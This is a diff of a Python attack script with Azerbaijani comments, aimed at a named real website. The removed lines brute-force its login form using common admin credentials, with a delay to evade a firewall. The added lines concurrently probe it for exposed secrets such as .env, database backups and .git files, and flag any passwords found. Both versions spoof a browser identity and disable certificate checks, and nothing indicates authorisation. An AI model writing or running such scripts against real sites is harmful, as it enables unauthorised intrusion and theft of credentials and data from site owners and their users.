@@ -1,61 +1,36 @@
 import asyncio
 import httpx
 
-TARGET_LOGIN_URL = "https://empro.az/login" # Tapdığın qapı
-
-# Sınaq üçün ən çox yayılmış laboratoriya kombinasiyaları
-USERS = ["admin", "administrator", "staff", "manager"]
-PASSWORDS = [
-    "admin123", "admin12345", "password", "123456", "qwerty", 
-    "root", "admin@123", "superuser", "admin2024", "admin2025"
+TARGET = "https://empro.az"
+# Daha ağır və kritik sızma nöqtələri
+CRITICAL_PATHS = [
+    "/admin.php", "/db_backup.sql", "/.env", "/v1/api", "/api/users", 
+    "/backup.tar.gz", "/old_website.zip", "/test.php", "/phpinfo.php",
+    "/.git/index", "/settings.py", "/database.php", "/db.php", "/connect.php"
 ]
 
-async def attempt_login(username, password, client):
-    # Saytın daxili login forması üçün data
-    # QEYD: Saytın formundakı 'name' sahələrinə görə bu datanı optimallaşdırırıq
-    login_data = {
-        "email": username, # Bəzi saytlarda istifadəçi adı, bəzilərində email olur
-        "password": password,
-        "login": "submit"
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Referer": TARGET_LOGIN_URL
-    }
-
+async def intruder(path, client):
+    url = f"{TARGET}{path}"
     try:
-        response = await client.post(TARGET_LOGIN_URL, data=login_data, headers=headers, follow_redirects=False)
+        # Brauzer kimi görünmək üçün xüsusi header
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"}
+        resp = await client.get(url, headers=headers, timeout=10)
         
-        # Əgər status 302 (Yönləndirmə) olsa, bu çox vaxt uğurlu giriş deməkdir
-        if response.status_code == 302 or (response.status_code == 200 and "dashboard" in response.text.lower()):
-            print(f"\n🔥 [SUCCESS] GİRİŞ ƏLDƏ EDİLDİ!")
-            print(f"🚩 USERNAME: {username}")
-            print(f"🚩 PASSWORD: {password}")
-            print(f"🔗 DASHBOARD: {response.headers.get('Location', 'Login successful')}")
-            return True
-        else:
-            print(f"[-] Uğursuz cəhd: {username}:{password}", end="\r")
-    except Exception:
+        if resp.status_code == 200:
+            # Əgər faylın içində şifrə və ya DB məlumatı olsa
+            print(f"🚩 [FATAL] KRİTİK FAYL TAPILDI: {url}")
+            if "DB_" in resp.text or "PASSWORD" in resp.text:
+                 print(f"   🔥 [CRITICAL] Faylın içində şifrələr aşkarlandı!")
+        elif resp.status_code == 403:
+             print(f"⚠️  [LOCKED] Gizli qovluq var amma kilidlidir: {url}")
+    except:
         pass
-    return False
 
 async def main():
-    print(f"⚒️  ADMIN PANELƏ SIZMA CƏHDİ BAŞLADI: {TARGET_LOGIN_URL}")
-    print(f"[*] Cəmi {len(USERS) * len(PASSWORDS)} kombinasiya yoxlanılır...\n")
-    
-    async with httpx.AsyncClient(verify=False) as client:
-        found = False
-        for user in USERS:
-            if found: break
-            for pwd in PASSWORDS:
-                if await attempt_login(user, pwd, client):
-                    found = True
-                    break
-                await asyncio.sleep(0.1) # WAF bloklamasın deyə qısa fasilə
-        
-        if not found:
-            print("\n\n[!] Standart şifrələrlə giriş alınmadı. Daha iri lüğət (wordlist) lazımdır.")
+    print(f"🕵️  DEEP-RECON BAŞLADI: {TARGET}")
+    async with httpx.AsyncClient(verify=False, http2=True) as client:
+        tasks = [intruder(p, client) for p in CRITICAL_PATHS]
+        await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
     asyncio.run(main())
